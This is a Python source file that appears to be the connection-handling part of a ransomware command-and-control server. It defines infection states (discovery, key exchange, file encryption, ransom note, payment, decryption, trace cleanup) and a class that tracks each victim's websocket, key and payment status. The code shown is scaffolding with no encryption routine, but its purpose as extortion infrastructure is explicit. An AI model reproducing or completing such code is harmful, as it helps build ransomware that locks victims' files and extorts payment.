import websockets
import asyncio 
from enum import Enum
class ConnectionState(Enum):
    CONNECTED = 1 # Connection established with the c2server
    IDENTIFIED = 2 # Envcheck done and username set
    DISCOVERED = 3 # System information found
    CRYPTOGRAPHIC_SETUP = 4 # Cryptographic information prepared and exchanged
    ENCRYPTED = 5 # Files on the system are encrypted
    RANSOMNOTED = 6 # Ransomnote has been dropped on the system
    DECRYPTION_REQUESTED = 7 # Client has requested decryption
    DECRYPTED = 8 # Files have been decrypted
    TRACES_CLEANED = 9 # Any traces of the infection have been removed
    DISCONNECTED = 10 # Connection with the client has been lost.


class Connection:
    def __init__(self, uri, socket: websockets.ServerConnection):
        self.uri = uri
        self.username = None
        self.websocket = socket
        self.state: ConnectionState = ConnectionState.CONNECTED
        self.__key = None
        self.is_paid = False


    def set_username(self, username):
        self.username = username

    def change_state(self, new_state: ConnectionState):
        self.state = new_state

    def set_key(self, key: bytes):
        self.__key = key

    def set_payment_status(self, status: bool):
        self.is_paid = status

    async def send_message(self, message):
        await self.websocket.send(message)

    async def start(self):
        try:
            async for message in self.websocket:
                print(f"[{self.username}] {message}")
        except websockets.exceptions.ConnectionClosed:
            print("Connection closed by the server.")

    def show_info(self):
        pass